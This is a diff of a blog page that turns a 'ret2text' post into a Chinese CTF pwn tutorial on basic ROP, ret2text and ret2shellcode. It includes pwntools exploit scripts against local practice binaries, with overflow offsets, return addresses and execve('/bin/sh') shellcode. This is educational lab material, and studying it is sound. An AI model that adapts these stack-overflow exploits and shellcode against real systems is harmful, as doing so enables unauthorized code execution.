@@ -16,16 +16,16 @@
   <meta name="author" content="Xkeo">
   <meta name="keywords" content="">
   
-    <meta name="description" content="ret2text原理ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。 这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。 示例文件:ret2text 查看一">
+    <meta name="description" content="随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ret2text">
-<meta property="og:url" content="http://kk-blog.top/posts/c7d49a8c372d/index.html">
+<meta property="og:title" content="基本ROP">
+<meta property="og:url" content="http://kk-blog.top/posts/496bcb83b3a4/index.html">
 <meta property="og:site_name" content="Xkeo&#39;s Blog">
-<meta property="og:description" content="ret2text原理ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。 这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。 示例文件:ret2text 查看一">
+<meta property="og:description" content="随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://kk-blog.top/img%5Cpage3.jpg">
 <meta property="article:published_time" content="2023-02-14T03:00:00.000Z">
-<meta property="article:modified_time" content="2023-02-14T12:06:21.586Z">
+<meta property="article:modified_time" content="2023-02-15T08:39:02.534Z">
 <meta property="article:author" content="Xkeo">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary_large_image">
@@ -33,7 +33,7 @@
   
   
   
-  <title>ret2text - Xkeo&#39;s Blog</title>
+  <title>基本ROP - Xkeo&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -211,7 +211,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="ret2text"></span>
+            <span id="subtitle" data-typed-text="基本ROP"></span>
           
         </div>
 
@@ -234,7 +234,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          571 字
+          1.8k 字
         
       </span>
     
@@ -245,7 +245,7 @@
         
         
         
-          5 分钟
+          15 分钟
         
       </span>
     
@@ -283,14 +283,23 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">ret2text</h1>
+            <h1 style="display: none">基本ROP</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
+                <p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程</strong>。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
+<p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p>
+<ol>
+<li><p>程序存在溢出，并且可以控制返回地址。</p>
+</li>
+<li><p>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</p>
+</li>
+</ol>
+<p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p>
+<h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
 <p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
-<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>文件:<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>文件:<img src="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text" srcset="/img/loading.gif" lazyload alt="ret2text"></p>
 <p><strong>查看一下程序的保护机制</strong><br><img src="https://t.gmit.vip/2023/02/14/x3m2b6.png" srcset="/img/loading.gif" lazyload><br>可以看到这是开启了NX保护的32位程序</p>
 <p><strong>ida查看代码</strong><br><img src="https://t.gmit.vip/2023/02/14/x3mb4j.png" srcset="/img/loading.gif" lazyload></p>
 <p>主程序中使用了gets函数，存在栈溢出。</p>
@@ -304,6 +313,21 @@
 <p><strong>exp</strong></p>
 <figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-built_in">io</span> = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)<br><br>address = p32(<span class="hljs-number">0x804863a</span>)<br>offset = <span class="hljs-number">112</span><br><br>payload = offset*b<span class="hljs-string">&#x27;a&#x27;</span> + address<br><br><span class="hljs-built_in">io</span>.sendline(payload)<br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure>
 <p>运行<br><img src="https://t.gmit.vip/2023/02/14/w69ij0.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。</strong></p>
+<p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p>
+<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><p>文件:<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2text</a></p>
+<p><strong>查看一下程序的保护机制</strong></p>
+<p><img src="https://pic.imgdb.cn/item/63ec9656f144a01007c509ac.png" srcset="/img/loading.gif" lazyload><br>没有任何保护</p>
+<p>ida查看代码</p>
+<p><img src="https://pic.imgdb.cn/item/63ec96c9f144a01007c61486.png" srcset="/img/loading.gif" lazyload></p>
+<p>gets函数可以溢出<br>然后看一下buf2的位置，看下是否可以执行，让我们插入shellcode<br><img src="https://pic.imgdb.cn/item/63ec9841f144a01007c9559a.png" srcset="/img/loading.gif" lazyload><br><img src="https://pic.imgdb.cn/item/63ec9864f144a01007c9ac71.png" srcset="/img/loading.gif" lazyload><br>具有可执行权限</p>
+<p><strong>求偏移量</strong><br>利用cyclic 200生成200个垃圾数据<br><img src="https://t.gmit.vip/2023/02/14/umt678.png" srcset="/img/loading.gif" lazyload></p>
+<p>运行输入后</p>
+<p><img src="https://t.gmit.vip/2023/02/14/vx31qq.png" srcset="/img/loading.gif" lazyload><br><img src="https://t.gmit.vip/2023/02/14/vxeey3.png" srcset="/img/loading.gif" lazyload></p>
+<p>偏移量为112</p>
+<p><strong>那么本类型题目思路：</strong><br><strong>1.让gets函数溢出，返回到buf2的位置</strong><br><strong>2.插入shellcode</strong><br><strong>3.在buf2中执行，获取shell</strong></p>
+<p><strong>exp</strong></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">from pwn import *<br>io = process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br><br><span class="hljs-comment">#pwntools自动生成shellcode</span><br><span class="hljs-keyword">shellcode </span>= asm(<span class="hljs-keyword">shellcraft.sh())</span><br><span class="hljs-keyword"></span><span class="hljs-comment">#手写shellcode</span><br><span class="hljs-comment">#shellcode = asm(&quot;&quot;&quot;</span><br> <span class="hljs-comment">#           push 0x68</span><br>  <span class="hljs-comment">#          push 0x732f2f2f</span><br>   <span class="hljs-comment">#         push 0x6e69622f</span><br>    <span class="hljs-comment">#        mov ebx, esp</span><br>     <span class="hljs-comment">#       xor ecx, ecx</span><br>      <span class="hljs-comment">#      xor edx, edx</span><br>        <span class="hljs-comment">#    push 11</span><br>         <span class="hljs-comment">#   pop eax</span><br>          <span class="hljs-comment">#  int 0x80</span><br>           <span class="hljs-comment">#     &quot;&quot;&quot;)</span><br><span class="hljs-comment">#buf2的地址</span><br><span class="hljs-keyword">buf2_addr </span>= <span class="hljs-number">0x804a080</span><br>payload = <span class="hljs-keyword">shellcode.ljust(112, </span><span class="hljs-keyword">b&#x27;a&#x27;) </span>+ p32(<span class="hljs-keyword">buf2_addr)</span><br><span class="hljs-keyword"></span><br>io.sendline(payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure>
 <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/</a></p>
 
                 
@@ -350,8 +374,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>ret2text</div>
-      <div>http://kk-blog.top/posts/c7d49a8c372d/</div>
+      <div>基本ROP</div>
+      <div>http://kk-blog.top/posts/496bcb83b3a4/</div>
     </div>
     <div class="license-meta">
       
